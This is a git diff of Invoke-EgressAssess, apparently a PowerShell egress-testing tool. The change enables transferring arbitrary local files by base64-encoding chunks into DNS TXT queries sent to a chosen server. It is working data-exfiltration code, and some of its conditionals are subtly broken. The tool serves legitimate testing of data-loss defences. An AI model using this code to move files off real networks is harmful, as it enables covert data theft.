@@ -130,7 +130,7 @@ function Invoke-EgressAssess
             Write-Verbose "[*] Testing server connection"
             $socketTcp = New-Object Net.Sockets.TcpClient
             $socketUdp = New-Object System.Net.Sockets.UdpClient
-            $ping = $true # $(Test-Connection -ComputerName $IP -Count 1 -Quiet)
+            $ping = $(Test-Connection -ComputerName $IP -Count 1 -Quiet)
             if ($ping -eq $true)
             {
                 Write-Verbose "[*] Server is UP on $IP."
@@ -1572,6 +1572,7 @@ function Invoke-EgressAssess
                 elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
                 {
                     if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
+                    $global:FileTransfer
                 }
             }
             else
@@ -1933,7 +1934,14 @@ function Invoke-EgressAssess
                         $Port = 53
                     }
 
-                    [Collections.Generic.List[byte]]$aaa = $DNSData
+                    if ($filetransfer)
+                    {
+                        [Collections.Generic.List[byte]]$aaa = $DNSData    
+                    }
+                    else
+                    {
+                        [Collections.Generic.List[char]]$aaa = $DNSData
+                    }
 
                     [int]$DefaultLength = 35
                     if ($DefaultLength -gt $aaa.Count)
@@ -1955,22 +1963,6 @@ function Invoke-EgressAssess
                     }
                     $CurrentTotal = $TotalPackets
                     
-                    ###DNS TXT Query "Header"
-                    #Trans ID  std query  
-                    [Byte[]]$Mess=0x00,0x01,0x05,0x00,0x00
-                    
-                    #Ans       Auth    Add RR
-                    [Byte[]]$Mess2= 0x00,0x00,0x00
-                    
-                    #no. of queries
-                    $Mess = $Mess + [Bitconverter]::GetBytes([int]1) +$Mess2
-
-                    ###DNS TXT Query "Footer"
-                    #suffix for each q
-                    #        null     type    class 
-                    $postS = 0x00,0x00,0x10,0x00,0x01
-                    $break = $false
-                    
                     While ($ByteReader -lt ($aaa.Count))
                     {
                         try
@@ -1979,22 +1971,18 @@ function Invoke-EgressAssess
                             {
                                 $DefaultLength = $aaa.count - $ByteReader
                             }
-                            
-                            $preamble = $PacketNumber.ToString()+".:|:."
-                            $EncodedData = [String]::Empty
-                            #$DataToSend = $DNSData.Substring($ByteReader, $DefaultLength)
-                            <#if(!$filetransfer)
+                            $preamble=""
+
+                            if ($filetransfer)
                             {
-                                $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($DataToSend)
-                                $EncodedData = [System.Convert]::ToBase64String($DataBytes)
-                            }#>
-                            #else
-                            #{
-                                $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($preamble)
-                                $DataBytes += $aaa.GetRange($ByteReader, $DefaultLength)
-                                $EncodedData = [System.Convert]::ToBase64String( $DataBytes)
-                            #}  
-                            Send-DNSPacket($EncodedData, "TXT")
+                                $preamble = $PacketNumber.ToString()+".:|:."
+                            }
+
+                            $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($preamble)
+                            $DataBytes += $aaa.GetRange($ByteReader, $DefaultLength)
+                            $EncodedData = [System.Convert]::ToBase64String( $DataBytes)
+                            
+                            Send-DNSPacket $EncodedData "TXT"
 
                             Write-Verbose "[*] Sending data .... $PacketNumber/$TotalPackets"
                             $PacketNumber += 1
@@ -2015,7 +2003,7 @@ function Invoke-EgressAssess
                         #filename limited to 63 - ENDTHISFILETRANSMISSIONEGRESSASSESS.length.  we might have to send chunks over 
                         $filename = (Get-ChildItem $Datatype).Name
                         $EncodedData = "ENDTHISFILETRANSMISSIONEGRESSASSESS"+ $filename #[System.Text.Encoding]::UTF8.GetBytes("ENDTHISFILETRANSMISSIONEGRESSASSESS"+$DataType)
-                        Send-DNSPacket($EncodedData, "TXT")
+                        Send-DNSPacket $EncodedData "TXT"
                     }
                     catch
                     {
@@ -2068,13 +2056,8 @@ function Invoke-EgressAssess
                     if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
                     $filetransfer = $true
 
-                    #$SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
-                    #$FileName = get-childitem $Datatype | % { $_.Name }
+                    $FileName = get-childitem $Datatype | % { $_.Name }
                     $DNSData = [io.File]::ReadAllbytes($DataType)
-                    
-                    #Write-Verbose "[*] You did not provide a data type to generate."
-                    #Write-Verbose "[*] DNS file transfers currently not supported."
-                    #break
                 }
             }
             else
@@ -2238,11 +2221,28 @@ function Invoke-EgressAssess
 
             if ($type = "TXT")
             {
+                ###DNS TXT Query "Header"
+                #Trans ID  std query  
+                [Byte[]]$Mess=0x00,0x01,0x05,0x00,0x00
+                    
+                #Ans       Auth    Add RR
+                [Byte[]]$Mess2= 0x00,0x00,0x00
+                    
+                #no. of queries
+                $Mess = $Mess + [Bitconverter]::GetBytes([int]1) +$Mess2
+
+                ###DNS TXT Query "Footer"
+                #suffix for each q
+                #        null     type    class 
+                $postS = 0x00,0x00,0x10,0x00,0x01
+                
                 $Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork
                 $Stype = [System.Net.Sockets.SocketType]::Dgram
                 $Ptype = [System.Net.Sockets.ProtocolType]::UDP
-                $addr = [System.Net.IPAddress]::Parse($IP)
 
+                $addr =  ([System.Net.Dns]::GetHostAddresses($IP))[0].IPAddresstoString
+
+                $addr = [System.Net.IPAddress]::Parse($addr)
                 $End = New-Object System.Net.IPEndPoint $addr, $Port;
                 $Sock = New-Object System.Net.Sockets.Socket $Saddrf, $Stype, $Ptype;
         	    $Sock.TTL = 26
